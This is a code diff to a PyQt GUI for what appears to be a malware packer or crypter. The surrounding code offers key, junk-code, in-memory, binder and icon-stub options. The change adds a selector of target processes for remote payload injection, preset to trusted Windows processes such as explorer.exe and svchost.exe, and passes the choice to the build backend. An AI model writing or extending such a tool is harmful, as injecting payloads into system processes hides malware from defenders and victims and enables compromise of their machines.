@@ -115,6 +115,22 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         options_h.addWidget(self.in_memory_cb)
         form.addRow("Options:", options_h)
 
+        # Injection target process (for remote process injection plugins)
+        inject_h = QtWidgets.QHBoxLayout()
+        self.inject_target_combo = QtWidgets.QComboBox()
+        self.inject_target_combo.setEditable(True)
+        self.inject_target_combo.addItems([
+            "explorer.exe",
+            "svchost.exe",
+            "notepad.exe",
+            "cmd.exe",
+            "RuntimeBroker.exe",
+            "sihost.exe"
+        ])
+        self.inject_target_combo.setToolTip("Target process for remote injection (injector plugins inject payload into this process)")
+        inject_h.addWidget(self.inject_target_combo)
+        form.addRow("Inject target:", inject_h)
+
         # Binder options
         self.enable_binder_cb = QtWidgets.QCheckBox("Run binder after build")
         self.binder_exe2_edit = QtWidgets.QLineEdit()
@@ -373,6 +389,7 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
                 self.key_edit.text(),
                 self.junk_spin.value(),
                 self.in_memory_cb.isChecked(),
+                inject_target=self.inject_target_combo.currentText().strip(),
                 log_fn=self._log_info,
                 warn_fn=self._log_warning,
             )
@@ -745,7 +762,7 @@ class MainWindow(QtWidgets.QMainWindow):  # type: ignore[misc]
         disable_default_plugins = (not entries)
         if disable_default_plugins:
             self._log_info("No plugins selected; skipping all plugin overlay")
-        self.backend.start_process(pack_cmd, plugin_dir=plugins_temp_dir, disable_plugins_default=disable_default_plugins, workdir=str(BIN_DIR), icon_stub_override=icon_stub_path)
+        self.backend.start_process(pack_cmd, plugin_dir=plugins_temp_dir, disable_plugins_default=disable_default_plugins, workdir=str(BIN_DIR), icon_stub_override=icon_stub_path, inject_target=self.inject_target_combo.currentText().strip())
 
     def _apply_icon_if_requested(self, target_path, label):
         if not self._icon_path or not target_path:
